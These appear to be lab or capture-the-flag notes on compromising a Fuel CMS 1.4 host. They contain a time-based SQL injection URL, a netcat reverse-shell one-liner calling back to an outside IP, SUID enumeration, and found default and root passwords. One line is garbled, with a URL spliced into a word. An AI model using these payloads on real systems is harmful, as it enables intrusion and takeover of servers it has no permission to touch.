## IP
10.67.173.54
## Enumeration
### Open ports and services
- 80 - HTTP - Apache httpd 2.5.18 
### Dirb
- /home
- fuel
- robots.txt (disallows /fuel)
- offline
## Vulnerabilities
http://10.67.173.54 directly exposes username and phttp://10.67.173.54/fuel/logs/items?type=debug&search_term=&limit=50&view_type=list&offset=0&order=desc&col=entry_date%20and%20(select%20*%20from(select(sleep(10)))a)&&fuel_inline=0assword to acces /fuel as admin
username = admin
password = admin
## Exploit
-- 1 --
In Fuel CMS 1.4 there's a SQLI in the query param col= in
http://10.67.173.54/fuel/logs
when a type is entered
``` PoC
http://127.0.0.1/fuel/logs/items?type=debug&search_term=&limit=50&view_type=list&offset=0&order=desc&col=entry_date and (select * from(select(sleep(1)))a)&fuel_inline=0
```
[!NOTE] CVE-2021-47980
-- 2 --
In Fuel CMS 1.4 there's a remote code execution
[!NOTE] CVE-2018-16763
## User Flag
User flag in /home/www-data/flag.txt
## Reverse Shell
``` sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.181 4444>/tmp/f 
```

``` python
python -c 'import pty;pty.spawn("/bin/bash")'
```
## Priviledge Escalation
### OS info
Linux ubuntu 16.04.6 LTS 
## SUID
``` bash
cmd: find / -perm -u=s -type f 2>/dev/null
system/usr/sbin/pppd
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/passwd
/bin/su
/bin/ping6
/bin/ntfs-3g
/bin/ping
/bin/mount
/bin/umount
/bin/fusermount
```

## Config
Found credential in /var/www/html/fuel/application/config/database.php
``` sh
su -
password: mememe
```